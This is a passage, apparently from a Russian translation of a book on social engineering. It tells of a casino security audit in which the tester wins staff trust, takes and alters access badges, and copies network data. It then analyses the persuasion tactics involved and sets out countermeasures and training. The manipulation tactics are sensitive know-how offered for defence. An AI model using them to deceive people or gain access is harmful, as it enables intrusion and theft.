отправились вместе в кафе, где Урли получил бесплатный обед и приобрел нового „друга“.  «Он спросил о моем опыте работы с сетями, и мы начали говорить о большом компьютере AS400, на котором работали все приложения казино. То, что события развивались именно таким образом, можно назвать только одним словом — невероятно». Невероятно, потому что глава ИТ-департамента, ответственный за компьютерную безопасность, делился различной внутренней информацией с Урли, даже не подумав удостовериться, с кем он разговаривает.  Говоря об этом, Урли отмечает, что «менеджеры среднего звена боятся „потерять лицо“. Как большинство из нас, они не хотят совершить ошибку и быть уличенными в этом. „Понимая это, вы получаете большое преимущество“. После обеда Ричард привел Урли обратно в NOC. „Когда мы вошли туда, он представил меня Ларри, главному системному администратору AS400. Он объяснил Ларри, что я собираюсь „попробовать их на прочность“, занимаясь аудитом в течение нескольких дней, и что мы вместе пообедали, и он уговорил меня провести некий предварительный аудит, «чтобы уберечь их от больших огорчений“, когда придет время основного аудита. После этого Урли выслушал от Ларри краткий обзор системы, собрав немало полезных сведений для своего отчета: например, что NOC хранит и обрабатывает всю информацию компании.  «Я сказал Ларри, что быстрее смогу помочь им, если у меня будет сетевая диаграмма, список доступа к межсетевому экрану и т.п. И он дал мне все это, только позвонив Ричарду для одобрения. Я подумал: „спасибо ему“.  Урли неожиданно вспомнил, что он оставил точку беспроводного доступа в одном из офисов. Хотя шансы быть пойманным сильно уменьшились после того, как он завел дружбу с Ричардом, он объяснил Ларри, что ему нужно вернуться и забрать точку доступа, которую он оставил. «Для этого мне потребуется бейдж, чтобы я мог войти в NOC, когда вернусь, и дальше входить и выходить по мере надобности». Ларри явно не хотелось этого делать, поэтому я предложил ему позвонить Ричарду еще раз. Он позвонил Ричарду и сказал, что гость хочет получить бейдж; Ричард предложил другое решение: недавно из казино было уволено несколько человек, их бейджи хранились в NOC, но никто их еще не уничтожил, «поэтому пусть воспользуется одним из них».  Урли вернул Ларри к разговору о системе, он знакомился с недавно принятыми мерами безопасности. Неожиданно Ларри позвонила его жена, явно недовольная и раздраженная чем-то. Урли насторожил уши, почувствовав, что может извлечь выгоду из этой ситуации. Ларри сказал своей жене: «Слушай, я сейчас не могу разговаривать. У меня в офисе человек». Урли дал понять Ларри, что он чувствует, как важен для него этот разговор с женой и что он сам возьмет бейдж, если Ларри покажет, где они лежат.  «Ларри провел меня в угол комнаты, выдвинул ящик и сказал: „возьми один из этих“. Затем он быстро вернулся к своему столу и продолжил разговор с женой. Я заметил, что на бейджах не было номеров, поэтому я взял две штуки из тех, что были там». Теперь у него был не просто бейдж, а бейдж, дающий ему доступ к NOC в любое время.  Урли отправился повидать свою новую подругу Меган, посмотреть на точку беспроводного доступа и поискать что-нибудь интересное. У него было на это время.  «Я понял, что у меня есть некоторое время, поскольку он занят разговором с женой, а такие разговоры всегда продолжаются дольше, чем хотелось бы. Я установил таймер на мобильном телефоне на двадцать минут, вполне достаточное время для проведения некоторых исследований без возбуждения недоверия у Ларри, который, как мне казалось, что-то подозревал».  Любой, кто работал в ИТ-департаменте, знает, что бейджи связаны с компьютерной системой; если получить доступ к компьютеру, то можно распространить возможности своего перемещения на все здание. Урли надеялся обнаружить компьютер, управляющий привилегиями доступа на бейджах, чтобы иметь возможность модифицировать те возможности, которые были на тех двух, что ему достались. Он шел по коридору и искал, где может быть расположен этот компьютер, но найти его оказалось сложнее, чем он думал. Урли почувствовал разочарование и усталость.  Он решил спросить кого-нибудь, и остановился на охраннике, который так доброжелательно отнесся к нему у служебного входа.  Многие сотрудники уже видели его вместе с Ричардом, поэтому о подозрительности и речи не было. Урли обратился к охраннику с вопросом о системе управления доступом в здание. Охранник даже не спросил, зачем ему это надо. Никаких проблем. Он подробно объяснил, где находится то, что искал Урли.  «Я нашел это место, и вошел в крошечную комнатку, где располагалась система управления. Этот компьютер стоял на полу и на экране был список уже открытых бейджей. Там не было ни пароля, ни скринсейвера —ничего, что могло помешать мне». По его мнению, это абсолютно типичная ситуация. «Для людей характерен подход „с глаз долой, из головы вон“. Е с л и такой компьютер располагается внутри охраняемой территории, никто не считает нужным заботиться о его безопасности».  Кроме получения доступа во все помещения, он хотел сделать еще одну вещь.  «Я думал, что просто для удовольствия добавлю некоторые привилегии на один из бейджей, поменяю на нем имя, а затем обменяюсь им с одним из сотрудников, который будет ходить по казино, неосознанно помогая мне проводить мой аудит. Кого же выбрать для этого? Меган, конечно, — с ней будет очень просто поменяться бейджами. Все, что мне надо будет сделать для этого, — это сказать, что мне нужна ее помощь для проведения аудита».  Когда Урли вошел, Меган встретила его так же дружелюбно, как и прежде. Он объяснил, что проверка закончена и ему надо получить свое оборудование назад. Затем он сказал Меган, что ему нужна ее помощь. «Большинство социальных инженеров подтвердит, что люди слишком охотно соглашаются помочь». Ему нужен был бейдж Ме-ган, чтобы сверить его с тем списком, что был у него. Через несколько мгновений у Меган был бейдж, который запутывал ситуацию еще больше, а у Урли был ее бейдж и еще один, в соответствии с которым он был большим начальником.  Когда Урли вернулся в офис Ларри, расстроенный менеджер только что закончил разговор с супругой. Наконец-то положив трубку, он был готов продолжить общение. Урли попросил подробно объяснить ему сетевую диаграмму, но потом сознательно сменил тему, чтобы обезоружить собеседника, и спросил, как обстоят дела у Ларри с женой. После этого они почти час обсуждали проблемы супружеской жизни. «В конце нашего разговора я был уверен, что с Ларри у меня больше не будет проблем. Поэтому я сказал ему, что в моем ноутбуке есть специальные программы для аудита, которые я должен запустить в сеть. Поскольку я обычно пользуюсь оборудованием последнего поколения, запустить ноутбук мне всегда просто, потому что нет человека на планете, который не захотел бы посмотреть его в работе».  Через какое-то время Ларри оставил меня, чтобы сделать несколько звонков и з а н я т ь с я своими делами. Предоставленный самому себе, Урли отсканировал сеть и смог проникнуть в несколько компьютеров, работающих как под Windows, так и под Linux, благодаря слабым паролям, а затем провел еще два часа, копируя разнообразную информацию из сети и даже з а п и с ы в а я ее на D V D , «о чем мне не было задано никаких вопросов».  «Завершив все свои дела, я подумал, что будет очень забавно и полезно попытаться сделать еще одну вещь. Я подошел к каждому, с кем мне пришлось общаться, даже к тем, с кем меня видели лишь короткое время, и сказал им такую фразу: „Слушайте, сделайте мне одолжение, Я люблю собирать фото всех мест, где я был, и людей, с которыми работал. Вы не согласитесь сфотографироваться со мной?“ Это бывает удивительно просто».  Некоторые сотрудники даже приглашали соседей из своих офисов, чтобы сфотографироваться вместе с ними.  У него уже было несколько бейджей, сетевых диаграмм и успешных доступов в сеть. Все это он тоже сфотографировал.  Во время заключительной встречи с заказчиками, глава внутреннего аудита пожаловался, что Урли не должен был физически проникать на территорию компании, «он не должен был атаковать таким путем». Урли также было сказано, что его действия граничат с «криминалом» и заказчики не приемлют подобных действий. Он объясняет:  «Почему казино считает мои действия нечестными? Ответ очень простой. Я никогда до этого не работал с казино и совершенно не знал их правил. Мой отчет мог привести к тому, что их компания подверглась бы аудиту Комиссии по играм, что могло привести к серьезным финансовым потерям».  Однако гонорар Урли был выплачен полностью, поэтому он совершенно не огорчился. Он искренне хотел произвести на клиента хорошее впечатление, но чувствовал, что они просто ненавидят его за использованные методы и считают их нечестными по отношению к компании и ее сотрудникам. «Они ясно дали мне понять, что больше не хотят иметь со мной дела».  Такого с ним еще не случалось — обычно клиенты принимали все результаты его проверок и смотрели на них, по его словам, как «на результаты серьезного анализа», что означало, что они вполне удовлетворены его методами проверки, адекватными тем, которые используют хакеры или социальные инженеры в реальной жизни. «Клиентов всегда впечатляли мои результаты. И я радовался и негодовал вместе с ними — до этого случая».  Подводя итог, Урли считает свою работу в Вегасе удачной в плане тестирования и неудачной в плане взаимоотношений с клиентом. «Боюсь, что больше мне в Вегасе не работать» — сожалеет он.  Можно только пожелать Комиссии по играм в дальнейшем иметь дело только с этичными хакерами, использующими исключительно высокоморальные пути проникновения в казино…   АНАЛИЗ   Социальный психолог Бред Сагарин, доктор философии, который специально исследовал технологии убеждения, так описывает арсенал социальных инженеров: «В их действиях нет ничего волшебного. Социальные инженеры используют те же способы убеждения, что и все мы повседневно. Мы играем какие-то роли. Мы стараемся завоевать доверие. Мы призываем к выполнению взаимных обязательств. Но социальный инженер использует все это только для того, чтобы манипулировать людьми, обманывать их самым подлым образом, часто с разрушительным эффектом».  Мы попросили доктора Сагарина описать психологические принципы, лежащие в основе самых распространенных методов социальных инженеров. В некоторых случаях он подкреплял свои объяснения примерами из предыдущей книги Митника и Саймона «Искусство обмана», которые иллюстрируют ту или иную тактику.  Каждый раздел начинается с простого объяснения принципа и наглядного примера.   ВХОЖДЕНИЕ   В   Р  О  Л  Ь   Социальный инженер обычно демонстрирует несколько характерных признаков той роли, которую он разыгрывает. Большинство из нас самостоятельно награждают исполнителя определенной роли дополнительными характеристиками, после того, как нам продемонстрируют некоторые знаковые элементы: мы видим человека в строгом костюме, рубашке и при галстуке, и автоматически предполагаем, что он умен, надежен и работоспособен.   Пример  : когда Урли вошел в комнату наблюдения, он был одет в хороший костюм и говорил уверенным командным голосом, и люди в комнате автоматически стали выполнять его указания. Он успешно совершил перехват роли менеджера казино.  Практически каждая атака социального инженера использует вхождение в роль, так что жертва атаки домысливает другие свойства роли и действует соответственно. Такой ролью может быть ИТ-техник, клиент, новый сотрудник или многие другие, которые лучше соответствуют потребностям атакующего.  Чаще всего вхождение в роль включает упоминание имени начальника «мишени», или имен других известных ему сотрудников, или использование местных терминов и жаргона. Для атаки на конкретного человека атакующий старается выбрать соответствующую одежду, аксессуары (значок компании, браслет, дорогую ручку, перстень с символикой престижной школы), стиль прически — все это способствует вхождению в роль, на которую претендует атакующий.  Сила этого метода заключается в том, что если вы посчитали человека кем-то — начальником, клиентом, обычным сотрудником, вы переносите на него и другие характеристики его образа (начальник всегда энергичен и уверен в себе, разработчик программ очень умен, но в социальном плане может выглядеть не слишком блестяще, сотруднику компании всегда можно доверять).  Сколько же нужно приложить усилий, чтобы люди тебе поверили? Не т а к много.   ДОВЕРИЕ   Установление доверительных отношений — это одна из наиболее распространенных атак социальной инженерии, фундамент всего следующего в дальнейшем.   Пример  : Урли вынудил Р и ч а р д а — начальника департамента ИТ — предложить ему пообедать вместе, прекрасно понимая, что все те, кто увидят его вместе с Ричардом, проникнутся к нему доверием.  Доктор Сагарин выделяет три метода, используемых в «Искусстве обмана», которые используют социальные инженеры для создания атмосферы доверия. Один из них заключается в том, что атакующий говорит нечто, что якобы работает против его интересов, как, например, в Главе 8 «Искусства обмана» в истории «Один простой звонок», когда атакующий сказал своей жертве: «Теперь напечатайте ваш пароль, но не называйте мне его. Вы никогда и никому не должны называть свой пароль, даже сотрудникам ИТ-персонала». Подобную фразу наверняка может произнести только честный человек.  Второй метод состоит в том, что жертву предупреждают о событии, которое (о чем не подозревает атакуемый) атакующий сам и создает. Например, в истории «Отказ сети», рассказанной в Главе 5 книги «Искусство обмана», где атакующий объясняет, что сетевое соединение может выйти из строя. Затем обманщик делает что-нибудь, что прерывает сетевое соединение жертвы, заставляя ее поверить в его искренность.  Эта тактика предсказания часто используется в сочетании с третьим методом, когда атакующий «доказывает» жертве, что ему можно доверять, устраняя возникшую проблему. Так и произошло в «Отказе сети», когда атакующий сначала предупредил, что сеть может выйти из строя, затем сделал так, что сетевое соединение прервалось, как он и предсказывал, а потом восстановил соединение, утверждая, что он «устранил проблему», вызвав у жертвы чувство доверия и благодарности.   ЖЕРТВУ   ЗАСТАВЛЯЮТ   ИГРАТЬ ОПРЕДЕЛЕННУЮ   Р  О  Л  Ь   Социальный инженер часто вынуждает свою мишень играть непривычную роль, например, принуждая ее к подчинению своим агрессивным поведением или взывая к жалости.   Пример  : Урли в своем разговоре с Ленорой встал в позицию человека, нуждающегося в помощи (только что расставшегося со своей девушкой, переехавшего в другой город и ищущего работу), чтобы поставить ее в роль помощника.  Чаще всего социальные инженеры стремятся, чтобы их мишень играла роль помощника. После того, как человек взял на себя эту роль, ему очень трудно из нее выйти.  Наиболее хитрый и опытный социальный инженер попытается придумать для жертвы такую роль, в которой та чувствовала бы себя комфортно. Затем он будет вести переговоры так, чтобы использовать жертву в этой роли — Урли сделал именно это с Ленорой и Ме-ган, когда почувствовал, что они с радостью будут помощниками. Люди с удовольствием берут на себя роли с положительным наполнением, которые позволяют им ощущать себя хорошими людьми.   СБИВАНИЕ   С   МЫСЛИ   Социальные психологи выделяют в процессе восприятия информации человеком два возможных типа — систематический и случайный.   Пример  : когда менеджеру пришлось в процессе работы разбираться в непростой ситуации со своей супругой, Урли использовал его эмоциональное состояние и именно в этот момент сделал запрос, который дал ему доступ к бейджам компании.  Доктор Сагарин объясняет: «Если вы думаете в систематическом режиме, то каждый сделанный запрос обдумываете спокойно и не спеша. Когда процесс идет случайным образом, вам приходится принимать решения быстро. Например, к нам может поступить запрос, на который придется отвечать под давлением мысли о том, кто задал этот вопрос, а не реально оценивать важность запрошенной информации. Мы всегда пытаемся работать в режиме систематического обдумывания, когда тема важна для нас. Но недостаток времени, отвлечение внимания или сильная эмоция может переключить нас в случайный режим».  Нам приятно думать, что обычно мы действуем рационально, логически, принимаем решения, основываясь на фактах. А психолог доктор Грегори Нейдерт говорит: «мозг человека находится в неработающем состоянии 90-95% времени». Социальные инженеры стремятся использовать это преимущество, стараясь всеми возможными способами вывести жертву из состояния систематичных размышлений — зная, что люди, размышляющие в случайном режиме, с гораздо меньшей вероятностью могут использовать ресурсы психологической защиты. Чаще всего, они утрачивают подозрительность, не задают вопросы, и не противопоставляют атакующему никаких резонов.  Социальные инженеры стремятся вступить в контакт с мишенями, когда те находятся в случайном режиме размышлений и удерживать их там. Один из способов достичь этого — позвонить жертве минут за пять до окончания рабочего дня, рассчитывая на то, что переключение с рабочих мыслей на домашние и желание уйти с работы вовремя могут заставить человека ответить на вопрос, который в другой ситуации вызвал бы подозрительность.   МОМЕНТ   СОГЛАСИЯ   Социальные инженеры создают момент согласия, делая целую серию запросов, начиная с совершенно безобидных.   Пример  : доктор Сагарин цитирует историю creditchex, рассказанную в первой главе «Искусства обмана», когда атакующий задает ключевой вопрос о важной информации — идентификационном номере в банке merchant, который используется как пароль для авторизации по телефону — в череде безобидных вопросов. Поскольку начальные вопросы кажутся безобидными, это устанавливает определенный настрой общения, в котором жертва и последующие вопросы рассматривает, как безобидные.  Телевизионный сценарист и продюсер Ричард Левинсон использовал похожую тактику в создании своего самого известного персонажа Коломбо, которого играет актер Петер Фальк. Все зрители прекрасно знают, что когда детектив уже уходит и напряжение спадает, — к радости подозреваемого, что он одурачил детектива, Коломбо оборачивается и задает один последний вопрос, ключевой вопрос, который он готовил все предшествующее время. Социальные инженеры часто используют такую тактику — «а вот еще один вопрос…»   ПОТРЕБНОСТЬ   ПОМОГАТЬ   Психологи считают, что люди испытывают позитивные эмоции, когда помогают другим. Помощь кому-то дает ощущение собственного могущества. Это может вывести нас из плохого состояния духа. Это может помочь нам самоутвердиться. Социальные инженеры находят много способов использовать наше стремление помогать другим.   Пример  : когда Урли показался у служебного входа в казино, охранник поверил его рассказу о приглашении симпатичной девушки на ужин, выдал ему деньги для этой цели, дал несколько советов, как надо обращаться с женщинами, и не стал требовать показать ему бейдж, когда Ур-ли с т а л удаляться.  Комментарий доктора Сагарина: «Поскольку социальные инженеры часто атакуют людей, которые просто не осознают ценности выдаваемой информации, помощь может рассматриваться, как небольшая расплата за достигнутый психологический комфорт. (Сколько стоит быстрый запрос в базу данных для собеседника на другом конце телефонной линии?)»   ПРИСВОЕНИЕ   Если человек присваивает себе некую роль, другие люди ведут себя по отношению к нему в соответствии с этой ролью. Цель социальной инженерии заключается в том, чтобы атакуемый воспринял атакующего как эксперта, вызывающего доверие, или надежного и правдивого человека.   Пример  : доктор Сагарин цитирует историю «Как продвинуться дальше», из главы 10 «Искусства обмана». Атакующий, в поисках доступа к комнате переговоров, какое-то время болтался вокруг да около, и тем самым успокоил подозрения окружающих, потому что люди считают, что злоумышленник не будет слишком долго находится там, где его можно поймать.  Социальный инженер может подойти к охраннику, положить пятидолларовую купюру на его стол и сказать: «Я нашел это на полу.  Может, кто-нибудь говорил вам, что потерял деньги?». Охранник сразу начинает относиться к нему, как к честному человеку, заслуживающему доверия.  Если мы видим человека, который открывает дверь перед пожилой женщиной, мы думаем, что он вежливый: если же женщина молодая и привлекательная, то мы приписываем его поведению совершенно другие мотивы.   СИМПАТИЯ   Социальные инженеры часто используют тот факт, что все люди более охотно говорят «да» в ответ на запрос людей, которые им симпатичны.   Пример  : Урли смог получить важную информацию от Леноры, девушки, которую он встретил в фитнес-центре, отчасти благодаря своему умению «читать мысли», вычисляя ее реакцию и постоянно подстраивая свои о т в е т ы под ее реакции. Э т о заставило ее подумать, ч т о у них общие вкусы и интересы («О, и я тоже!»). Ее чувство симпатии к нему сделало ее более открытой и готовой поделиться с ним информацией, которую он хотел получить.  Людям нравятся те, кто похож на них, имеет такие же склонности, аналогичное образование и хобби. Социальный инженер всегда тщательно изучает всю информацию, связанную с мишенью атаки, чтобы выяснить ее личные интересы — теннис, старые самолеты, коллекция антикварных ружей или все, что угодно. Социальный инженер может увеличивать чувство симпатии, используя комплименты или откровенную лесть, а также и собственную внешнюю привлекательность.  Следующая тактика — использование известного имени, которое мишень атаки знает и любит. В этом случае атакующий старается выглядеть членом «группы» внутри компании. Обманщики часто льстят и говорят комплименты, стремясь воздействовать на жертву, которая недавно была вознаграждена за какие-то достижения. Ублажение личных амбиций может способствовать привлечению жертвы на роль помощника.   СТРАХ   Социальный инженер иногда убеждает свою жертву в том, что должны случиться ужасные вещи, — но эту катастрофу можно предотвратить, если действовать так, как предлагает атакующий.   Пример  : в истории «Аварийная заплатка», изложенной в главе 12 книги «Искусство обмана», социальный инженер пугает свою жертву, что она потеряет важную информацию, если не согласится установить «аварийную заплатку» на сервер базы данных компании. Страх делает жертву уязвимой и заставляет согласиться с решением, которое предлагает социальный инженер.  Атаки, основанные на использовании более высокого статуса, базируются на чувстве страха. Социальный инженер, замаскировавшись под руководителя компании, может атаковать секретаря или молодого сотрудника своим «срочным» запросом, основываясь на том, что жертва согласится выполнить его запрос, боясь получить взыскание или даже потерять работу.   РЕАКТИВНОСТЬ   Реактивность — это естественный ответ человеческой психики на ситуацию, угрожающую свободе. В реактивном состоянии мы теряем чувство перспективы и все остальное уходит в тень.   Пример  : две истории в «Искусстве обмана» иллюстрируют силу реактивности — в первом случае жертве грозили потерей важного приложения, во втором — потерей доступа к сети.  В типичной атаке, использующей реактивность, злоумышленник говорит своей жертве, что доступа к компьютерным файлам не будет в течение какого то срока и называет совершенно неприемлемый период времени. «Вы не сможете получить доступ к своим файлам в течение двух следующих недель, но мы сделаем все возможное, чтобы этот срок не увеличился». Когда атакуемый начинает проявлять свои эмоции, атакующий предлагает восстановить файлы быстрее: все, что нужно для этого — назвать имя пользователя и пароль. Жертва, напуганная возможными потерями, обычно с радостью соглашается.  Другой способ заключается в том, чтобы использовать принцип дефицита или заставить мишень гнаться за обещанной выгодой. Например, вас заманивают на Интернет-сайт, где информация о вашей кредитной карточке может быть украдена. Как вы отреагируете на электронное письмо, которое пообещает новый iPod от Apple всего за 200 долларов, но только первой тысяче обратившихся? Может быть, поспешите на сайт и зарегистрируетесь, чтобы купить один из них? И когда вы зарегистрируетесь, укажете адрес электронной почты, и выберете пароль, признайтесь — это ведь будет тот же самый пароль, который вы используете повсюду?   КОНТРМЕРЫ   Защита от атак социальных инженеров требует целой серии скоординированных усилий, включая и такие:  • разработка четких и ясных протоколов безопасности, согласованно вводимых в масштабах всей компании;  • разработка тренингов по усилению бдительности персонала;  • разработка простых и понятных правил определения важности информации;  • разработка простых и понятных правил, четко определяющих случаи обращения к закрытым данным (взаимодействие с компьютерным оборудованием с неизвестными последствиями для оного), дабы личность пользователя была идентифицирована согласно политике компании;  • разработка грамотной системы классификации данных;  • обучение персонала навыкам сопротивления методам социальной инженерии;  • проверка готовности сотрудников к противостоянию атакам по методу социальной инженерии при помощи специальных проверок.  Наиболее важный аспект программы — установление соответствующих протоколов безопасности и мотивация сотрудников для их выполнения. И в дополнение к этому — установление ключевых точек, где разработанные программы и тренинги противостоят угрозе социальных инженеров.   ПЛАН   ТРЕНИНГОВ   Вот некоторые ключевые позиции для тренингов:  •  убедите сотрудников в том, что социальные инженеры наверняка будут где-то атаковать компанию, причем многократно. Существует явная недооценка угрозы, которую представляют собой атаки социальных инженеров; часто даже полное незнание того, что такая угроза существует. Обычно люди не ждут обмана и манипуляций, поэтому неосознанно подпадают под атаку социальной инженерии. Многие Интернет-пользователи получают электронную почту из Нигерии с предложением перевести значительные суммы денег в США; в них предлагаются неплохие комиссионные за помощь. Потом вас просят перевести некоторую сумму для того, чтобы начать процедуру передачи денег. Одна леди из Нью-Йорка недавно поверила этим предложениям и заняла сотни тысяч долларов у своего сотрудника, чтобы начать процедуру перевода. И вместо того, чтобы наслаждаться отдыхом на своей яхте, которую она уже видела почти купленной, она стоит перед малоприятной перспективой очутиться на казенной койке в одной из американских тюрем. Люди постоянно покупаются на эти ловушки социальных инженеров, иначе нигерийские «спамеры» перестали бы рассылать свои письма.  •  используйте ролевые игры для наглядной демонстрации уязвимости каждого перед технологиями социальных инженеров, обучайте сотрудников, кик им противостоять. Большинство людей работают, пребывая в полной иллюзии собственной неуязвимости, считая себя очень умными для того, чтобы их можно было обмануть, обжулить, манипулировать ими, или влиять на них. Они считают, что так можно поступить только с « г л у —пыми» людьми. Есть два способа помочь сотрудникам понять свою уязвимость и поверить в необходимость защиты. Один из них заключается в демонстрации эффективности социальной инженерии путем «подставы» некоторых сотрудников под такую атаку, а затем разбора случившегося на специальном семинаре по безопасности. Другой состоит в подробном анализе конкретных методов социальной инженерии, с целью демонстрации уязвимости всех и каждого подобным атакам. В каждом случае тренинг должен содержать подробный анализ механизма атаки, причин ее успеха и обсуждения способов распознавания атаки и противостояния ей.  •  надо развить в сотрудниках умение чувствовать обман или манипулирование со стороны социальных инженеров. На тренингах надо объяснить сотрудникам их персональную ответственность за защиту важной корпоративной информации. Организаторы таких тренингов обязательно должны учитывать, что мотивация к выполнению некоторых процедур обеспечения безопасности у людей в определенных ситуациях только возрастает, если они хорошо понимают необходимость применения тех или иных протоколов. Во время тренингов преподаватели должны давать наглядные примеры того, как те или иные меры безопасности защищают бизнес, и какой ущерб может быть нанесен компании, если сотрудники будут игнорировать их или выполнять недостаточно тщательно. Очень важно обратить внимание на то, что успешная атака может нанести ущерб персонально сотруднику или его друзьям и знакомым. В базе данных компании может содержаться особо ценная для воров и н ф о р м а ц и я о людях. Но главный мотивационный фактор — это то, что никто не хочет быть обманутым или обмишуленным, или позволить кому-то собой манипулировать. Именно поэтому люди всегда имеют мотивацию противостоять обману и жульничеству, надо просто обратить их внимание на это.   ПРОГРАММЫ   ДЛЯ   ПРОТИВОСТОЯНИЯ СОЦИАЛЬНОЙ   ИНЖЕНЕРИИ   Вот несколько основных моментов, которые необходимо учитывать при разработке программ:  •  Надо разработать четкий план действий для сотрудников в случае обнаружения атаки социальной инженерии.   Мы отсылаем читателей к обширному списку политик безопасности, приведенных в «Искусстве обмана». Из них надо выбрать те, которые подходят именно вам. После того, как компания выбрала нужные процедуры и внедрила их в жизнь, эта информация должна быть выложена на сайте компании, чтобы она была постоянно доступна для сотрудников. Еще один прекрасный ресурс — это учебный курс Чарльза Крессона Вуда по разработке политик информационной безопасности «Information Security Policies Made Easy» (San Jose, CA: Baseline Software, 2001).  •  Надо разработать простые правила для сотрудников, позволяющие определять, какая информация является важной для компании.   Поскольку мы обрабатываем информацию в случайном режиме большую часть времени, нужно разработать простые правила безопасности, которые отслеживают все запросы к важной информации (такой, как конфиденциальная бизнес-информация или индивидуальные пароли). После того, как сотрудник осознал, что произошел запрос о важной информации или о некотором компьютерном действии, он должен свериться с принятым руководством по политике безопасности, чтобы определить верный алгоритм процедуры, которому надо следовать.  Кроме того, важно осознать и донести до сотрудников, что даже информация, которая не считается особенно важной, может быть полезной социальному инженеру, собирающему крупицы информации, внешне бесполезной, но которую он может использовать для создания атмосферы доверия и симпатии. Имя менеджера или название важного проекта компании, место нахождения команды разработчиков, имя сервера, которым пользуются сотрудники, имя, которым назван секретный проект — все это важно, и каждой компании нужно определить необходимую степень защиты от возможных угроз безопасности.  Есть несколько наглядных примеров информации, которая на первый взгляд не является важной, но может использоваться атакующим. В книге «Искусство обмана» описано несколько сценариев, которые могут быть полезны преподавателям для подтверждения этой мысли.  •  Надо видоизменить правила вежливости — научиться правильно отвечать «Нет!»   Большинство из нас чувствует себя неловко, когда приходится отвечать «нет» другим людям. (Некоторые современные технологические продукты разработаны в расчете на людей, которые слишком вежливы для того, чтобы отказаться от назойливой телефонной рекламы. Когда рекламный агент звонит, пользователь нажимает на « * » и кладет трубку на рычаг; после этого приятный голос говорит звонящему: «Извините, пожалуйста, но я должен сообщить вам, что мы с большим сожалением отвергаем ваше предложение». Больше всего в этой фразе мне нравятся слова «с большим сожалением». Интересно и то, что множество людей приобретают себе электронное устройство, которое говорит «нет» вместо них. Вы лично согласились бы заплатить некоторую цену за устройство, которое оградит вас от отрицательных эмоций в процессе произнесения слова «нет»?)  Программа компании по противодействию атакам социальной инженерии одной из задач должна ставить изменение норм вежливости. Новое поведение должно состоять в умении вежливо отклонить запрос о важной информации, пока не будет установлена личность запрашивающего и его право на доступ к этой информации. Например, надо научить всех отвечать так: «Как сотрудники нашей компании, мы оба знаем, насколько важно следовать протоколам безопасности. Поэтому мы оба понимаем, что я должен проверить ваш допуск перед тем, как выполнить ваш запрос».  •  Разработать процедуры для проверки личности человека и его авторизации.   Для каждого бизнеса должен быть разработан процесс проверки личности и авторизации людей, запрашивающих информацию или требующих каких-то действий от сотрудников компании. Процесс проверки в любой ситуации должен зависеть от важности информации или запрашиваемых действий. При этом нужно увязывать требования безопасности с бизнес-процессами.  Тренинг должен научить сотрудников идентифицировать людей не только самыми простыми методами, вроде взгляда на визитную карточку, — что использовал Урли в нашей истории, но и более серьезные. (Вспоминается один персонаж Джеймса Гарнера в детективной серии «Файлы Рокфорда» девяностых годов, у которого в машине был специальный принтер для визитных карточек, так что он мог снабдить себя любой, какая ему потребуется).  В нашей книге «Искусство обмана» была приведена процедура идентификации. •  Получить поддержку руководства кампании   Это звучит почти банально: любая важная инициатива в компании начинается с того, что ее должно активно поддерживать руководство. Есть лишь несколько корпоративных сфер, в которых подобная поддержка так важна, как в области безопасности, и важность последней возрастает еще более оттого, что она непосредственно не влияет на прибыль компании и потому ей часто отводится одно из последних мест в стратегии компании.  В общем, для обеспечения безопасности нужны усилия всей компании, начиная, естественно, с ее руководства.  В специальном документе руководители компании должны высказать два четких положения по этому поводу. Сотрудники никогда не должны получать от руководства указаний обойти протокол безопасности. Ни один сотрудник не должен быть наказан за то, что будет следовать протоколу безопасности, даже если он получил от руководства указание нарушить его.   ПОЗНАКОМЬТЕСЬ   С   МАНИПУЛЯТОРАМИ В   С  В  О  Е  Й   С  Е  М  Ь  Е   —   ЭТО   ВАШИ   ДЕТИ   Почему дети (или большинство из них) так прекрасно манипулируют нами? Ничуть не хуже, чем это делают социальные инженеры. С возрастом это умение теряется. Каждый родитель не раз и не два был мишенью атаки со стороны своих детей. Когда ребенку хочется чего-то, что не разрешено, он может быть настойчив до такой степени, что это не только утомляет, но даже начинает забавлять.  Когда мы с Биллом Саймоном уже заканчивали эту книгу, я был свидетелем полноценной атаки социальной инженерии со стороны ребенка. Моя подружка Дарси и ее девятилетняя дочь Брианна приехали ко мне в Даллас, где я был по делам бизнеса. Вечером в отеле перед тем, как отправиться на вечерний самолет, Брианна испытывала терпение своей мамы, требуя пойти ужинать в выбранный ею ресторан, и проявляя при этом типично детский темперамент. Дарси решила слегка обуздать ее, отобрав у нее Gameboy, и запретив играть в него в течение суток.  Брианна на время утихла, но затем потихоньку начала пробовать другие пути воздействия на свою мать, чтобы получить свою игру обратно, и это продолжалось и тогда, когда я вернулся и присоединился к ним. Постоянное детское нытье было совершенно изнуряющим: потом мы поняли, что она пытается добиться своего типичными методами социального инженера и стали делать заметки.  • «Мне скучно; верните мне мою игру». (Сказано тоном приказа, а не просьбы).  • «Я сведу вас с ума, если не смогу играть в мою игру». (Сопровождается завыванием).  • «Мне нечего будет делать в самолете без моей игры». (Говорится тоном: «Любой идиот это понимает»).  • «Будет ведь очень здорово, если я сыграю хоть разок, правда?» (Обещание, заключенное в вопросе)  • «Я буду очень хорошей, если вы вернете мне мою игру». (С невероятной искренностью).  • «Я хорошо вела себя вчера, почему же я не могу играть в игру сегодня?» (Отчаянная попытка, основанная на запутанной логике).  • «Я никогда не буду больше себя так вести. (Пауза). Можно я поиграю в игру сейчас?» («Никогда не буду это делать» — какими же легковерными она нас считает!)  • «Можно мне получить игру назад, пожалуйста?» (Если обещания не действуют, то можно попробовать выпрашивание…)  • «Завтра мне надо возвращаться в школу, и я хочу поиграть сейчас, потому что потом я долго-долго не буду играть». (Господи, сколько же может быть различных форм социальной инженерии? Может, надо было взять ее соавтором в эту книгу?).  • «Я была не права и очень сожалею об этом. Можно мне поиграть хоть немного?» (Признание очень важно для души, но может не сработать в качестве способа манипуляции).  • «Кевин, позволь мне сделать это». (Я подумал, что только хакер мог так повести себя!)  • «Без игры мне очень грустно». (Если больше ничего не работает, то надо разжалобить или вызвать симпатию).  • «Больше, чем полдня я сижу без моей игры…» (Другими словами: «Не достаточное ли это наказание за мой проступок?»)  • «Это ведь не стоит ни копейки — дать мне поиграть». (Отчаянная попытка отыскать доводы, которые заставляют маму длить наказание так долго. Неправильная догадка).  • «Это же выходные в честь моего дня рождения, и я могу играть в свои игры». (Еще одна попытка добиться симпатии).  А вот, как ее действия продолжались в аэропорту, к чему мы были готовы.  • «Мне будет скучно в аэропорту». (Ошибочно надеясь на то, что детская скука — это такая страшная вещь, которой взрослые будут стремиться избежать любой ценой. Если Брианне станет совсем уж скучно, она может порисовать или почитать книгу).  • «Это будет трехчасовой полет, и мне будет совсем нечего делать!» (Остается 